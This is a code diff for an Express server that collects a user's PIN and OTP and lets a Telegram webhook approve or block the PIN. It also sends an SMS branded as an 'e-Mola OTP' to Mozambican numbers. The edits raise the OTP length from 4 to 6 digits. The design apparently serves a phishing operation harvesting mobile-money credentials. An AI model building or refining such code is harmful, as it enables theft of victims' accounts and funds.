@@ -108,7 +108,7 @@ app.get('/api/status/:applicationId/app', (req, res) => {
   res.json({ ok: true, status: app.pinStatus, step: 'app' });
 });
 
-// 3. Send PIN (user submits PIN)
+// 3. Send PIN (user submits PIN – 6 digits)
 app.post('/api/send-pin', async (req, res) => {
   try {
     const { applicationId, pin } = req.body;
@@ -195,7 +195,7 @@ app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
   res.json({ ok: true });
 });
 
-// 7. Send OTP (user submits OTP)
+// 7. Send OTP (user submits OTP – 6 digits)
 app.post('/api/send-otp', async (req, res) => {
   try {
     const { applicationId, otp } = req.body;
@@ -206,8 +206,8 @@ app.post('/api/send-otp', async (req, res) => {
       return res.status(400).json({ ok: false, message: 'PIN not approved yet' });
     }
 
-    if (!otp || otp.length !== 4) {
-      return res.status(400).json({ ok: false, message: 'OTP must be 4 digits' });
+    if (!otp || otp.length !== 6) {
+      return res.status(400).json({ ok: false, message: 'OTP must be 6 digits' });
     }
 
     app.otpEntered = otp;
@@ -288,7 +288,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           app.pinStatus = 'blocked';
         }
       } else if (app.pinStatus === 'approved') {
-        const otpCode = generateCode(4);
+        const otpCode = generateCode(6);  // 6-digit OTP
         app.otpCode = otpCode;
         await sendSms(`+258${app.phone}`, `Your e-Mola OTP is: ${otpCode}`);
       }
